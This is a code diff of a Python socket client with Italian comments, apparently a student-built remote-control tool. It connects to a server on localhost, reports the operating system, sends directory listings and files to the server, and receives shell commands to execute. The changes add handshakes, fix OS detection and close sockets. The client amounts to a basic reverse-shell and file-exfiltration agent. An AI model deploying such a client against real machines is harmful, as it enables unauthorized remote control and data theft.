@@ -14,6 +14,7 @@ def sendDir(clientSocket, cmd):
 def exitNClose(clientSocket):
     out = "Ok"
     clientSocket.send(out.encode())
+    clientSocket.close()
     return True
 
 
@@ -30,10 +31,12 @@ def changeDirectory(clientSocket, cmd):
     clientSocket.send(out.encode())
 
 
-def getFile(clientSocket, fileName):
+def getFile(clientSocket: socket, fileName):
     fileSize = os.path.getsize(fileName)
+    clientSocket.recv(4).decode()
     fileSize = str(fileSize)
     clientSocket.send(fileSize.encode())
+    clientSocket.recv(4).decode()
     fileSize = int(fileSize)
     file = open(fileName, 'rb')
     while fileSize > 0:
@@ -50,7 +53,7 @@ def getFile(clientSocket, fileName):
 
 def StartConnection():  # apre la connessione con il server
     serverName = 'localhost'
-    serverPort = 12001
+    serverPort = 12014
     clientSocket = socket(AF_INET, SOCK_STREAM)
 
     while True:
@@ -75,12 +78,15 @@ def sendOsInfo(clientSocket: socket):  # funzione che invia informazioni di sist
 
 def RecuperaOs(clientSocket: socket):
     global windowsFlag
-    if platform.machine().find("Windows"):
+    if "Windows" in platform.system():
         clientSocket.send("w".encode())
         windowsFlag = "w"
+        print("Ci troviamo su Windows")
     else:
         clientSocket.send("u".encode())
         windowsFlag = "u"
+        print("Ci troviamo su Unix")
+
 
 
 def searchCmd(clientSocket, cmd):
@@ -107,7 +113,7 @@ def main():
             RecuperaOs(clientSocket)
             esc = False
 
-            while not esc:
+            while not esc: #non ho capito perche ci questa?
                 cmd = clientSocket.recv(1024).decode()
                 if len(cmd) == 0:
                     break
@@ -143,11 +149,13 @@ def main():
                     shellCommand = clientSocket.recv(1024).decode() #78
                     if searchCmd(clientSocket, shellCommand):
                         print("true")
-
+            break
         except Exception as e:
             print(e)
             print("errore Riavvio in corso")
             clientSocket.close()
+
+
 
 
 if __name__ == "__main__":
